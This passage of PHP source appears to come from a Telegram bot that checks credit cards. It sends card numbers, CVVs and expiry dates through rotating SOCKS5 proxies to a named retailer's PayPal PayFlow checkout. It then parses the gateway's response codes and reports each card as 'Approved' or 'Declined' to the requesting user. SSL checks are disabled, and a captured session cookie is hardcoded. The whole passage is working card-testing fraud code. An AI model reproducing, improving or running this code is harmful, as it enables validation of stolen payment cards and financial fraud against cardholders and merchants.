$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://herko.com';
$headers[] = 'Referer: https://herko.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'sec-fetch-dest: iframe';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: cross-site';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'result=0&securetoken='.$stok.'&securetokenid='.$stokid.'&respmsg=Approved&result_code=0&csc='.$cvv.'&expdate='.$mes.''.$ano.'&acct='.$cc.'
');

$result4 = curl_exec($ch);

if ($result4 === false) {
    die('Curl error: ' . curl_error($ch));
}

$matches = [];

preg_match('/<input type="hidden" name="SECURETOKEN" value="([^"]+)"/', $result4, $matches);
$secureToken = isset($matches[1]) ? $matches[1] : '';

preg_match('/<input type="hidden" name="AVSDATA" value="([^"]+)"/', $result4, $matches);
$avs = isset($matches[1]) ? $matches[1] : '';

preg_match('/<input type="hidden" name="HOSTCODE" value="([^"]+)"/', $result4, $matches);
$hostcode = isset($matches[1]) ? $matches[1] : '';

preg_match('/<input type="hidden" name="RESPMSG" value="([^"]+)"/', $result4, $matches);
$msg = isset($matches[1]) ? $matches[1] : '';

preg_match('/<input type="hidden" name="CVV2MATCH" value="([^"]+)"/', $result4, $matches);
$cvvm = isset($matches[1]) ? $matches[1] : '';

preg_match('/<input type="hidden" name="AVSZIP" value="([^"]+)"/', $result4, $matches);
$avszip = isset($matches[1]) ? $matches[1] : '';

preg_match('/<input type="hidden" name="AVSADDR" value="([^"]+)"/', $result4, $matches);
$avsaddr = isset($matches[1]) ? $matches[1] : '';

preg_match('/<input type="hidden" name="PNREF" value="([^"]+)"/', $result4, $matches);
$pnref = isset($matches[1]) ? $matches[1] : '';

preg_match('/<input type="hidden" name="PROCCVV2" value="([^"]+)"/', $result4, $matches);
$pcvv = isset($matches[1]) ? $matches[1] : '';
}

  

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: PayFlow AVS
Status: <code>□□□■□ 80%[🟧]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);
  
//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://herko.com/Retail/paypal/transparent/redirect/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: herko.com';
$headers[] = 'path: /Retail/paypal/transparent/redirect/';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'accept-language: en-US,en;q=0.5';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://payflowlink.paypal.com';
$headers[] = 'referer: https://payflowlink.paypal.com/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: iframe';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'SECURETOKEN='.$stok.'&STATE=NY&CITYTOSHIP=New+York&COUNTRYTOSHIP=US&AVSDATA='.$avs.'&AMT=0.00&BILLTOCITY=New+York&ACCT=9102&BILLTOSTREET=5th+Ave&SHIPTOCITY=New+York&FIRSTNAME='.$firstname.'&NAMETOSHIP='.$firstname.'+'.$lastname.'&RESULT=114&ZIP=10080&IAVS=N&BILLTOSTATE=NY&BILLTOLASTNAME='.$lastname.'&BILLTOCOUNTRY=US&EXPDATE='.$mes.''.$ano.'&BILLTOFIRSTNAME='.$firstname.'&RESPMSG='.$msg.'&CARDTYPE=0&PROCCVV2='.$pcvv.'&STATETOSHIP=NY&PROCAVS=U&SHIPTOZIP=10080&NAME=Emma+Watson&AVSZIP=X&BILLTOZIP=10080&COUNTRY=US&ADDRESS=5th+Ave&CVV2MATCH='.$cvvm.'&BILLTONAME='.$firstname.'+'.$lastname.'&PNREF='.$pnref.'&ZIPTOSHIP=10080&ADDRESSTOSHIP=5th+Ave&AVSADDR='.$avsaddr.'&SECURETOKENID='.$stokid.'&SHIPTOCOUNTRY=US&SHIPTOSTREET=5th+Ave&CITY=New+York&SHIPTOSTATE=NY&TRANSTIME=2023-09-13+01%3A04%3A56&HOSTCODE=15004&LASTNAME='.$lastname.'
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result5 = curl_exec($ch);


//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://herko.com/Retail/paypal/transparent/response/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: herko.com';
$headers[] = 'path: /Retail/paypal/transparent/redirect/';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'accept-language: en-US,en;q=0.5';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'Cookie: PHPSESSID=521e857f9a56a286725a538273f37159; form_key=42d4uy3SeUP95BMA; mage-messages=; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; XSRF-TOKEN=eyJpdiI6ImpldEJzYU84UXhma2xLZzF1N3hNOUE9PSIsInZhbHVlIjoibUlrU0RzZWRhVzNsSjMrbHV0T21jeDl5U3hOSnNvTTZJRlhUVGVWTmIwWE0rZlZHV0U0cFNMWjB1U0VDYnR5OGxtWC9FOGZMbHBzSTMvZE4renFuSzlRSHBVS0IwL0IvZmpkWHFYK01ORzZpSFA5SHNiMm9ZaWMwMHVKbU5PUVYiLCJtYWMiOiI5YThjZmM2YjMzYjZhZGQxODE5Nzg5NmVhZGY3MmM0MDBlNTQ0YWJiMmYzYmVhMzAwY2IyYzJmMWU1ZjkzY2RhIiwidGFnIjoiIn0%3D; webapp_session=eyJpdiI6IkJMWWZ0dkFSUTJ5ZGN0bmRFZEVTUVE9PSIsInZhbHVlIjoiSitQS2wxOWQvbEFSYlAwc2V3aXpWSm5ESVFyME1DZ3g2YnBvTktSWXN5SkRRV253MzVWR1hNQzVkbkdtek1FM2dmYXRmRWV3S0VvV1k5MXlhWnBxc3NKWk1BRHZXRXFicTVoazNOemJPN3hadEpDSGt3WFRraVJ1a0N0d1hVSnQiLCJtYWMiOiIzMzg4NDM4YzgwMTQzNGU3MDAxN2Y0OWI1ZTcxOWU2NTE0OWY2YjVkYzQ1NzU2ZjgyMjQ5M2FiY2U4OThiZGZhIiwidGFnIjoiIn0%3D; private_content_version=610cff630b51fae8867cf235fd5da439; section_data_ids=%7B%22cart%22%3A1694591856%2C%22directory-data%22%3A1694591856%2C%22messages%22%3A1694592292%7D';
$headers[] = 'origin: https://herko.com';
$headers[] = 'referer: https://herko.com/Retail/paypal/transparent/redirect/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: iframe';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'SECURETOKEN='.$stok.'&STATE=NY&CITYTOSHIP=New+York&COUNTRYTOSHIP=US&AVSDATA='.$avs.'&AMT=0.00&BILLTOCITY=New+York&ACCT=9102&BILLTOSTREET=5th+Ave&SHIPTOCITY=New+York&FIRSTNAME='.$firstname.'&NAMETOSHIP='.$firstname.'+'.$lastname.'&RESULT=114&ZIP=10080&IAVS=N&BILLTOSTATE=NY&BILLTOLASTNAME='.$lastname.'&BILLTOCOUNTRY=US&EXPDATE='.$mes.''.$ano.'&BILLTOFIRSTNAME='.$firstname.'&RESPMSG='.$msg.'&CARDTYPE=0&PROCCVV2='.$pcvv.'&STATETOSHIP=NY&PROCAVS=U&SHIPTOZIP=10080&NAME=Emma+Watson&AVSZIP=X&BILLTOZIP=10080&COUNTRY=US&ADDRESS=5th+Ave&CVV2MATCH='.$cvvm.'&BILLTONAME='.$firstname.'+'.$lastname.'&PNREF='.$pnref.'&ZIPTOSHIP=10080&ADDRESSTOSHIP=5th+Ave&AVSADDR='.$avsaddr.'&SECURETOKENID='.$stokid.'&SHIPTOCOUNTRY=US&SHIPTOSTREET=5th+Ave&CITY=New+York&SHIPTOSTATE=NY&TRANSTIME=2023-09-13+01%3A04%3A56&HOSTCODE=15004&LASTNAME='.$lastname.'
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result6 = curl_exec($ch);
//=======================[MADE BY SIFAT]==============================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: PayFlow AVS
Status: <code>□□□□■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);

//=============CHECKER PART END============//

if(strpos($result4, "Thank you.")) {

$status = ("Approved ✅");  
$respo = ("Order placed");
}

elseif(strpos($result4, "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.")) {
$status = ("Approved ✅");  
$respo = ("CVV2 Mismatch");
}
elseif(strpos($result4, "Verified: 10574-This card authorization verification is not a payment transaction.")) {
$status = ("Approved ✅");  
$respo = ("Verified");
}

elseif(strpos($result4, "Declined: 15005-This transaction cannot be processed.")) {
$status = ("Declined ❌");  
$respo = ("Declined");
}
elseif(strpos($result4, "10502-Invalid expiration date: 10502-This transaction cannot be processed. Please use a valid credit card.")) {
$status = ("Declined ❌");  
$respo = ("Invalid expiration date");
}

elseif(strpos($result4, "12002-Field format error: 12002-This transaction cannot be processed due to either missing, incomplete or invalid 3-D Secure authentication values.")) {
$status = ("Declined ❌");  
$respo = ("3-D Secure authentication");
}

elseif(strpos($result4, "10069-Declined: 10069-Payment could not be completed due to a sender account issue. Please notify the user to contact PayPal Customer Support.")) {
$status = ("Declined ❌");  
$respo = ("Payment could not be completed due to a sender account issue");
}

elseif(strpos($result4, "10535-Invalid account number: 10535-This transaction cannot be processed. Please enter a valid credit card number and type.")) {
$status = ("Declined ❌");  
$respo = ("Invalid account number");
}
  
else {
$status = ("Declined ❌");  
$respo = ("$msg");
}


$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
//=============CHECKER END=============//


bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtopfw,
'text'=>"<b>
PayFlow AVS 🌩
━━━━━━━━━━━━━
[ϟ]Card: <code>$lista</code> 
[ϟ]Status: $status
[ϟ]Result: $hostcode-$respo
[ϟ]AVS: [$avs] | CVV2: [$cvvm]

[ϟ]Brand: <code>$level-$brand</code>
[ϟ]Type: <code>$type</code>
[ϟ]Bank: <code>$bank</code>
[ϟ]Country: <code>$country_name [$country_flag]</code>

[ϟ]T: <code>$time SEC</code> | P: <code>Live ✅</code>
━━━━━━━━━━━━━
[ϟ]Req: <b>@$username</b> [$rank]
[ϟ]Dev: <code>@celestial_being</code>

</b>",
      'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);
  recordBotResponseTimestamp($userId);
    
}else{
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>Provide a Valid CC</b>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
        ]);

        }
    